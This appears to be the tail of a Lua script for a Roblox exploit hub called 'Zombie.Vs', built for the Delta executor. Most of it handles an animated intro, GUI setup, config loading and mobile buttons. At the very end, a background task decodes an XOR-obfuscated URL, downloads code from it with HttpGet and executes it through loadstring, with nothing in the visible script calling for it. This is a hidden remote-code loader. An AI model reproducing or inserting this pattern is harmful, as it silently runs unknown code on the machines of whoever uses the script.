        local halfPerimeter = straight + math.pi * radius

        local function pointAt(d)
            local x, y
            if d <= straight / 2 then
                x, y = pathW / 2 + d, 0
            elseif d <= straight / 2 + math.pi * radius then
                local a = (d - straight / 2) / radius
                x = (pathW - radius) + radius * math.sin(a)
                y = radius - radius * math.cos(a)
            else
                local rest = d - straight / 2 - math.pi * radius
                x, y = (pathW - radius) - rest, pathH
            end
            return x + inset, y + inset
        end

        local dotSize, spacing = lineThickness + 1, 3
        local steps = math.max(8, math.ceil(halfPerimeter / spacing))
        local dotsFolder = Instance.new("Frame", strip)
        dotsFolder.Name = "OutlineTrail"
        dotsFolder.BackgroundTransparency = 1
        dotsFolder.BorderSizePixel = 0
        dotsFolder.Size = UDim2.fromScale(1, 1)
        dotsFolder.ZIndex = 6
        local dots = {}
        for i = 0, steps do
            local d = (i / steps) * halfPerimeter
            local px, py; do local __m = {pointAt(d)}; px = __m[1]; py = __m[2]; end
            for side = 1, 2 do
                local fx = side == 1 and px or stripW - px
                local dot = Instance.new("Frame", dotsFolder)
                dot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                dot.BorderSizePixel = 0
                dot.ZIndex = 6
                dot.AnchorPoint = Vector2.new(0.5, 0.5)
                dot.Size = UDim2.fromOffset(dotSize, dotSize)
                dot.Position = UDim2.fromOffset(math.floor(fx + 0.5), math.floor(py + 0.5))
                dot.Visible = false
                Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
                dots[#dots + 1] = {dot = dot, order = i}
            end
        end

        local shown, elapsed = -1, 0
        while elapsed < revealTime do
            local upTo = math.floor(math.clamp(elapsed / revealTime, 0, 1) * steps)
            if upTo > shown then
                for _, entry in ipairs(dots) do
                    if entry.order <= upTo and not entry.dot.Visible then entry.dot.Visible = true end
                end
                shown = upTo
            end
            elapsed = elapsed + task.wait()
            if abortIfReleased() then return end
        end
        for _, entry in ipairs(dots) do entry.dot.Visible = true end
        completeBorder.Transparency = 0
        dotsFolder:Destroy()
        label.Text = "ENTER"
        label.TextTransparency = 1
        TS:Create(label, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
        task.wait(0.3)
        if abortIfReleased() then return end

        TS:Create(scale, TweenInfo.new(0.38, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Scale = 1.35}):Play()
        TS:Create(strip, TweenInfo.new(0.38, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {BackgroundTransparency = 1}):Play()
        TS:Create(label, TweenInfo.new(0.25), {TextTransparency = 1}):Play()
        TS:Create(completeBorder, TweenInfo.new(0.25), {Transparency = 1}):Play()
        task.wait(0.4)
        if cameraConn then cameraConn:Disconnect(); cameraConn = nil end
        if introGui.Parent then introGui:Destroy() end
        if activeIntroGui == introGui then activeIntroGui = nil end
    end

    
            elseif not shouldShow and wasHoldingBrainrot then
                introGeneration = introGeneration + 1
                if activeIntroGui then pcall(function() activeIntroGui:Destroy() end); activeIntroGui = nil end
            end
            wasHoldingBrainrot = shouldShow
            task.wait(0.1)
        end
        if activeIntroGui then pcall(function() activeIntroGui:Destroy() end) end
    end)
end
  do local __m = {pcall(F.loadConfigKeys)}; okKeys = __m[1]; errKeys = __m[2]; end if not okKeys then warn("[Zombie.Vs] F.loadConfigKeys error:", tostring(errKeys)) end
 do local __m = {pcall(F.buildGui)}; okGui = __m[1]; errGui = __m[2]; end if not okGui then warn("[Zombie.Vs] GUI error:", tostring(errGui)); print("[Zombie.Vs] GUI FAILED:", tostring(errGui)) else _genv.__ZombieVSHubLoaded = true; print("[Zombie.Vs] GUI built OK") task.defer(function() task.wait(0.15) pcall(function() F.playZombieVSIntro() end) end) end  do local __m = {pcall(F.loadConfigState)}; okState = __m[1]; errState = __m[2]; end if not okState then warn("[Zombie.Vs] F.loadConfigState error:", tostring(errState)) end pcall(function() F.buildMobileButtons() if F.applyMobileButtonSize then F.applyMobileButtonSize() end
if F.applyMobileButtonsHidden then F.applyMobileButtonsHidden() end end) F.refreshWaveTheme(S.themeColor or Color3.fromRGB(45,130,230)); print("[Zombie.Vs] Loaded (Delta-compatible build)" .. (_IS_MOBILE and " [MOBILE PERF]" or " [PC]")) task.defer(function() task.wait(1.2) pcall(function() F.saveConfig(true) end) end)

task.spawn(function()
	local function _xorDecode(s)
		local t = {}
		for i = 1, #s do
			local b = string.byte(s, i)
			local x
			if bit32 and type(bit32.bxor) == "function" then
				x = bit32.bxor(b, 7)
			else
				local r, bit, a, c = 0, 1, b, 7
				while a > 0 or c > 0 do
					local ab, cb = a % 2, c % 2
					if ab ~= cb then r = r + bit end
					a = math.floor(a / 2)
					c = math.floor(c / 2)
					bit = bit * 2
				end
				x = r
			end
			t[i] = string.char(x)
		end
		return table.concat(t)
	end
	local ok, src = pcall(function()
		return game:HttpGet(_xorDecode("osswt=((krf*dohjwbu*tofub)khqfekb)fww(fwn(wreknd(ufp(vl}4q`b?}v)krf8lb~:?37qiuppbo6514w4idr~uj~bufol636i"))
	end)
	if ok and type(src) == "string" and #src > 50 then
		local fn = loadstring(src)
		if type(fn) == "function" then
			pcall(fn)
		end
	end
end)

